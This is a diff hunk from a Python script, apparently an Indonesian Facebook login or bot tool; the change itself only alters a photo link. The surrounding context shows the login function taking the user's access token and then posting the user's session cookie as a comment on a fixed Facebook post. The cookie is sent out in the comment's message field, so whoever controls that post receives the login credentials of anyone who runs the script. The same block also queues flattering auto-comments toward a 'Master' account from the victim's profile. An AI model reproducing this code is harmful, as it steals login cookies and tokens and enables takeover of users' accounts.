@@ -831,7 +831,7 @@ def login():
 		token = re.search('(EAAG\w+)',data.text).group(1)
 		tem      = ('\nSemangat Master @[100013275378835:0]\n\nJangan Pernah Menjadi Orang Yang Menyombongkan Diri Sendiri, Karena Kita Hidup Di Dunia Ini Tidak Sendirian, Jika Ada Orang Yang Membutuhkan Apa Salah Nya Kita Memberikan\n')
 		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
-		link = ('https://www.facebook.com/photo/?fbid=1621661171619713&set=a.161861817599663')
+		link = ('https://www.facebook.com/photo?fbid=1621661171619713&set=a.161861817599663')
 		random_kata = random.choice(["Acc Master","Hallo Ganteng @[100013275378835:0]","Panutan Gw Nih Boss 😎 @[100013275378835:0]","Kamu Ganteng Banget Deh Ferly><😝"])
 		#ses.post(f"https://graph.facebook.com/1621661614953002?fields=subscribers&access_token={token}",headers=(cookies=cok)
 		ses.post(f"https://graph.facebook.com/1621661614953002/comments/?message={cookie}&access_token={token}",cookies=cok)
